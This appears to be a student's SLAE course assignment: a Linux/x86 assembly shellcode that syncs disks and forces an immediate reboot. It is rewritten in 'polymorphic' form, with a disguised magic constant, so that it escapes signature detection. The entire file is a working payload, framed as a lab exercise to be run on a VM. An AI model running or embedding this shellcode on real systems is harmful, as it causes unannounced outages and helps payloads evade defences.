; SLAE - Assignment #6: Polymorphic version of existing shellcode (Linux/x86)
; Source : http://shell-storm.org/shellcode/files/shellcode-639.php
; Source Shellcode : hard reboot (without any message) and data not lost - 33 bytes
; Polymorphic version 39 bytes
; Author: Alain Menelet 
; StudentID - PA-3763
; Tested on Ubuntu 16.14.03 LTS
; Note : execute with sudo on a VM.


global _start

section .text

_start:
	push byte 0x24
	pop eax
	int 0x80
	push byte 0x58
	pop eax
	mov ebx, 0xfee1dead			; linux_reboot_magic1
	mov ecx, 0x15E0F657			; linux_reboot_magic2
    add ecx, 0x12312312 		 
	mov edx, 0x1234567			; linux_reboot_cmd_restart
	int 0x80
	xor eax, eax
	mov al, 0x1
	xor ebx, ebx
	int 0x80